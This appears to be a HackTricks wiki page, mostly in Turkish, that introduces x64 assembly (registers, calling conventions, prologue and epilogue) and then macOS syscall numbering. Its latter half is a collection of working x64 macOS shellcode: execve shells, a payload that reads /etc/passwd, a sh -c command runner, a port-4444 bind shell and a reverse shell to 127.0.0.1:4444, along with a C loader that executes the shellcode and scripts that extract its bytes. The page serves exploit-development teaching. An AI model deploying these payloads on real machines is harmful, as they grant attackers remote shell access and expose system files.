# Introduction to x64

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **Introduction to x64**

x64, ayrıca x86-64 olarak bilinir, esas olarak masaüstü ve sunucu bilgisayarlarında kullanılan 64-bit bir işlemci mimarisidir. Intel tarafından üretilen x86 mimarisinden türetilmiş ve daha sonra AMD tarafından AMD64 adıyla benimsenmiştir; günümüzde kişisel bilgisayarlar ve sunucularda yaygın olarak kullanılan mimaridir.

### **Registers**

x64, x86 mimarisini genişleterek **16 genel amaçlı kayıt** sunar: `rax`, `rbx`, `rcx`, `rdx`, `rbp`, `rsp`, `rsi`, `rdi`, ve `r8` ile `r15`. Her biri **64-bit** (8-byte) bir değeri saklayabilir. Bu kayıtlar ayrıca uyumluluk ve belirli görevler için 32-bit, 16-bit ve 8-bit alt kayıtlar içerir.

1. **`rax`** - Geleneksel olarak **fonksiyonlardan dönen değerler** için kullanılır.
2. **`rbx`** - Genellikle bellek işlemleri için bir **temel kayıt** olarak kullanılır.
3. **`rcx`** - Sıklıkla **döngü sayacı** olarak kullanılır.
4. **`rdx`** - Uzatılmış aritmetik işlemler de dahil olmak üzere çeşitli rollerde kullanılır.
5. **`rbp`** - Yığın çerçevesi için **temel işaretçi**.
6. **`rsp`** - **Yığın işaretçisi**, yığının en üstünü takip eder.
7. **`rsi`** ve **`rdi`** - Dize/bellek işlemlerinde **kaynak** ve **hedef** indeksleri için kullanılır.
8. **`r8`** ile **`r15`** - x64'te tanıtılan ek genel amaçlı kayıtlar.

### **Calling Convention**

x64 çağrı konvansiyonu işletim sistemlerine göre değişir. Örneğin:

* **Windows**: İlk **dört parametre** **`rcx`**, **`rdx`**, **`r8`** ve **`r9`** kayıtlarında geçilir. Diğer parametreler yığına itilir. Dönen değer **`rax`** içindedir.
* **System V (genellikle UNIX benzeri sistemlerde kullanılır)**: İlk **altı tamsayı veya işaretçi parametre** **`rdi`**, **`rsi`**, **`rdx`**, **`rcx`**, **`r8`** ve **`r9`** kayıtlarında geçilir. Dönen değer de **`rax`** içindedir.

Fonksiyonun altıdan fazla girişi varsa, **geri kalan yığında geçilecektir**. **RSP**, yığın işaretçisi, **16 byte hizalanmış** olmalıdır; bu, işaret ettiği adresin herhangi bir çağrıdan önce 16'ya tam bölünebilir olması gerektiği anlamına gelir. Bu, genellikle bir fonksiyon çağrısı yapmadan önce RSP'nin düzgün bir şekilde hizalanmasını sağlamamız gerektiği anlamına gelir. Ancak pratikte, sistem çağrıları bu gereklilik karşılanmasa bile birçok kez çalışır.

### Calling Convention in Swift

Swift'in kendi **çağrı konvansiyonu** vardır, [**burada bulabilirsiniz**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64)

### **Common Instructions**

x64 talimatları, önceki x86 talimatlarıyla uyumluluğu koruyarak ve yenilerini tanıtarak zengin bir set sunar.

* **`mov`**: Bir **değeri** bir **kayıttan** veya **bellek konumundan** diğerine **taşır**.
* Örnek: `mov rax, rbx` — `rbx`'teki değeri `rax`'e taşır.
* **`push`** ve **`pop`**: Değerleri **yığına** itme veya yığından alma.
* Örnek: `push rax` — `rax`'teki değeri yığına iter.
* Örnek: `pop rax` — Yığının en üstündeki değeri `rax`'e alır.
* **`add`** ve **`sub`**: **Toplama** ve **çıkarma** işlemleri.
* Örnek: `add rax, rcx` — `rax` ve `rcx`'teki değerleri toplar ve sonucu `rax`'te saklar.
* **`mul`** ve **`div`**: **Çarpma** ve **bölme** işlemleri. Not: Bunların operand kullanımıyla ilgili belirli davranışları vardır.
* **`call`** ve **`ret`**: **Fonksiyonları çağırmak** ve **dönmek** için kullanılır.
* **`int`**: Yazılım **kesintisi** tetiklemek için kullanılır. Örneğin, `int 0x80` 32-bit x86 Linux'ta sistem çağrıları için kullanılmıştır.
* **`cmp`**: İki değeri **karşılaştırır** ve sonuca göre CPU'nun bayraklarını ayarlar.
* Örnek: `cmp rax, rdx` — `rax`'ı `rdx` ile karşılaştırır.
* **`je`, `jne`, `jl`, `jge`, ...**: Önceki bir `cmp` veya testin sonuçlarına göre kontrol akışını değiştiren **koşullu atlama** talimatları.
* Örnek: `cmp rax, rdx` talimatından sonra, `je label` — `rax` `rdx`'e eşitse `label`'e atlar.
* **`syscall`**: Bazı x64 sistemlerde (modern Unix gibi) **sistem çağrıları** için kullanılır.
* **`sysenter`**: Bazı platformlarda optimize edilmiş bir **sistem çağrısı** talimatıdır.

### **Function Prologue**

1. **Eski temel işaretçiyi it**: `push rbp` (çağıranın temel işaretçisini kaydeder)
2. **Mevcut yığın işaretçisini temel işaretçiye aktar**: `mov rbp, rsp` (mevcut fonksiyon için yeni temel işaretçiyi ayarlar)
3. **Yerel değişkenler için yığında alan ayır**: `sub rsp, <size>` (burada `<size>`, gereken byte sayısıdır)

### **Function Epilogue**

1. **Mevcut temel işaretçiyi yığın işaretçisine aktar**: `mov rsp, rbp` (yerel değişkenleri serbest bırak)
2. **Eski temel işaretçiyi yığından al**: `pop rbp` (çağıranın temel işaretçisini geri yükler)
3. **Dön**: `ret` (kontrolü çağırana geri verir)

## macOS

### syscalls

Farklı syscall sınıfları vardır, [**burada bulabilirsiniz**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/osfmk/mach/i386/syscall\_sw.h)**:**
```c
#define SYSCALL_CLASS_NONE	0	/* Invalid */
#define SYSCALL_CLASS_MACH	1	/* Mach */
#define SYSCALL_CLASS_UNIX	2	/* Unix/BSD */
#define SYSCALL_CLASS_MDEP	3	/* Machine-dependent */
#define SYSCALL_CLASS_DIAG	4	/* Diagnostics */
#define SYSCALL_CLASS_IPC	5	/* Mach IPC */
```
Sonra, her syscall numarasını [**bu URL'de**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)**:** bulabilirsiniz.
```c
0	AUE_NULL	ALL	{ int nosys(void); }   { indirect syscall }
1	AUE_EXIT	ALL	{ void exit(int rval); }
2	AUE_FORK	ALL	{ int fork(void); }
3	AUE_NULL	ALL	{ user_ssize_t read(int fd, user_addr_t cbuf, user_size_t nbyte); }
4	AUE_NULL	ALL	{ user_ssize_t write(int fd, user_addr_t cbuf, user_size_t nbyte); }
5	AUE_OPEN_RWTC	ALL	{ int open(user_addr_t path, int flags, int mode); }
6	AUE_CLOSE	ALL	{ int close(int fd); }
7	AUE_WAIT4	ALL	{ int wait4(int pid, user_addr_t status, int options, user_addr_t rusage); }
8	AUE_NULL	ALL	{ int nosys(void); }   { old creat }
9	AUE_LINK	ALL	{ int link(user_addr_t path, user_addr_t link); }
10	AUE_UNLINK	ALL	{ int unlink(user_addr_t path); }
11	AUE_NULL	ALL	{ int nosys(void); }   { old execv }
12	AUE_CHDIR	ALL	{ int chdir(user_addr_t path); }
[...]
```
Bu nedenle, **Unix/BSD sınıfından** `open` syscall'ını (**5**) çağırmak için bunu eklemeniz gerekir: `0x2000000`

Yani, open'ı çağırmak için syscall numarası `0x2000005` olacaktır.

### Shellcodlar

Derlemek için:

{% code overflow="wrap" %}
```bash
nasm -f macho64 shell.asm -o shell.o
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib
```
{% endcode %}

Baytları çıkarmak için:

{% code overflow="wrap" %}
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "shell.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done

# Another option
otool -t shell.o | grep 00 | cut -f2 -d$'\t' | sed 's/ /\\x/g' | sed 's/^/\\x/g' | sed 's/\\x$//g'
```
{% endcode %}

<details>

<summary>Shellcode'u test etmek için C kodu</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

[**buradan**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s) alındı ve açıklandı.

{% tabs %}
{% tab title="adr ile" %}
```armasm
bits 64
global _main
_main:
call    r_cmd64
db '/bin/zsh', 0
r_cmd64:                      ; the call placed a pointer to db (argv[2])
pop     rdi               ; arg1 from the stack placed by the call to l_cmd64
xor     rdx, rdx          ; store null arg3
push    59                ; put 59 on the stack (execve syscall)
pop     rax               ; pop it to RAX
bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall
```
{% endtab %}

{% tab title="yığın ile" %}
```armasm
bits 64
global _main

_main:
xor     rdx, rdx          ; zero our RDX
push    rdx               ; push NULL string terminator
mov     rbx, '/bin/zsh'   ; move the path into RBX
push    rbx               ; push the path, to the stack
mov     rdi, rsp          ; store the stack pointer in RDI (arg1)
push    59                ; put 59 on the stack (execve syscall)
pop     rax               ; pop it to RAX
bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall
```
{% endtab %}
{% endtabs %}

#### cat ile oku

Amaç `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)` komutunu çalıştırmaktır, bu nedenle ikinci argüman (x1) bir parametreler dizisidir (bellekte bu, adreslerin bir yığını anlamına gelir).
```armasm
bits 64
section .text
global _main

_main:
; Prepare the arguments for the execve syscall
sub rsp, 40         ; Allocate space on the stack similar to `sub sp, sp, #48`

lea rdi, [rel cat_path]   ; rdi will hold the address of "/bin/cat"
lea rsi, [rel passwd_path] ; rsi will hold the address of "/etc/passwd"

; Create inside the stack the array of args: ["/bin/cat", "/etc/passwd"]
push rsi   ; Add "/etc/passwd" to the stack (arg0)
push rdi   ; Add "/bin/cat" to the stack (arg1)

; Set in the 2nd argument of exec the addr of the array
mov rsi, rsp    ; argv=rsp - store RSP's value in RSI

xor rdx, rdx    ; Clear rdx to hold NULL (no environment variables)

push    59      ; put 59 on the stack (execve syscall)
pop     rax     ; pop it to RAX
bts     rax, 25 ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall         ; Make the syscall

section .data
cat_path:      db "/bin/cat", 0
passwd_path:   db "/etc/passwd", 0
```
#### sh ile komut çağırma
```armasm
bits 64
section .text
global _main

_main:
; Prepare the arguments for the execve syscall
sub rsp, 32           ; Create space on the stack

; Argument array
lea rdi, [rel touch_command]
push rdi                      ; push &"touch /tmp/lalala"
lea rdi, [rel sh_c_option]
push rdi                      ; push &"-c"
lea rdi, [rel sh_path]
push rdi                      ; push &"/bin/sh"

; execve syscall
mov rsi, rsp                  ; rsi = pointer to argument array
xor rdx, rdx                  ; rdx = NULL (no env variables)
push    59                    ; put 59 on the stack (execve syscall)
pop     rax                   ; pop it to RAX
bts     rax, 25               ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall

_exit:
xor rdi, rdi                  ; Exit status code 0
push    1                     ; put 1 on the stack (exit syscall)
pop     rax                   ; pop it to RAX
bts     rax, 25               ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall

section .data
sh_path:        db "/bin/sh", 0
sh_c_option:    db "-c", 0
touch_command:  db "touch /tmp/lalala", 0
```
#### Bind shell

**port 4444**'te [https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html](https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html) adresinden Bind shell
```armasm
section .text
global _main
_main:
; socket(AF_INET4, SOCK_STREAM, IPPROTO_IP)
xor  rdi, rdi
mul  rdi
mov  dil, 0x2
xor  rsi, rsi
mov  sil, 0x1
mov  al, 0x2
ror  rax, 0x28
mov  r8, rax
mov  al, 0x61
syscall

; struct sockaddr_in {
;         __uint8_t       sin_len;
;         sa_family_t     sin_family;
;         in_port_t       sin_port;
;         struct  in_addr sin_addr;
;         char            sin_zero[8];
; };
mov  rsi, 0xffffffffa3eefdf0
neg  rsi
push rsi
push rsp
pop  rsi

; bind(host_sockid, &sockaddr, 16)
mov  rdi, rax
xor  dl, 0x10
mov  rax, r8
mov  al, 0x68
syscall

; listen(host_sockid, 2)
xor  rsi, rsi
mov  sil, 0x2
mov  rax, r8
mov  al, 0x6a
syscall

; accept(host_sockid, 0, 0)
xor  rsi, rsi
xor  rdx, rdx
mov  rax, r8
mov  al, 0x1e
syscall

mov rdi, rax
mov sil, 0x3

dup2:
; dup2(client_sockid, 2)
;   -> dup2(client_sockid, 1)
;   -> dup2(client_sockid, 0)
mov  rax, r8
mov  al, 0x5a
sub  sil, 1
syscall
test rsi, rsi
jne  dup2

; execve("//bin/sh", 0, 0)
push rsi
mov  rdi, 0x68732f6e69622f2f
push rdi
push rsp
pop  rdi
mov  rax, r8
mov  al, 0x3b
syscall
```
#### Ters Shell

Ters shell [https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html](https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html) adresinden. Ters shell **127.0.0.1:4444** adresine.
```armasm
section .text
global _main
_main:
; socket(AF_INET4, SOCK_STREAM, IPPROTO_IP)
xor  rdi, rdi
mul  rdi
mov  dil, 0x2
xor  rsi, rsi
mov  sil, 0x1
mov  al, 0x2
ror  rax, 0x28
mov  r8, rax
mov  al, 0x61
syscall

; struct sockaddr_in {
;         __uint8_t       sin_len;
;         sa_family_t     sin_family;
;         in_port_t       sin_port;
;         struct  in_addr sin_addr;
;         char            sin_zero[8];
; };
mov  rsi, 0xfeffff80a3eefdf0
neg  rsi
push rsi
push rsp
pop  rsi

; connect(sockid, &sockaddr, 16)
mov  rdi, rax
xor  dl, 0x10
mov  rax, r8
mov  al, 0x62
syscall

xor rsi, rsi
mov sil, 0x3

dup2:
; dup2(sockid, 2)
;   -> dup2(sockid, 1)
;   -> dup2(sockid, 0)
mov  rax, r8
mov  al, 0x5a
sub  sil, 1
syscall
test rsi, rsi
jne  dup2

; execve("//bin/sh", 0, 0)
push rsi
mov  rdi, 0x68732f6e69622f2f
push rdi
push rsp
pop  rdi
xor  rdx, rdx
mov  rax, r8
mov  al, 0x3b
syscall
```
{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}
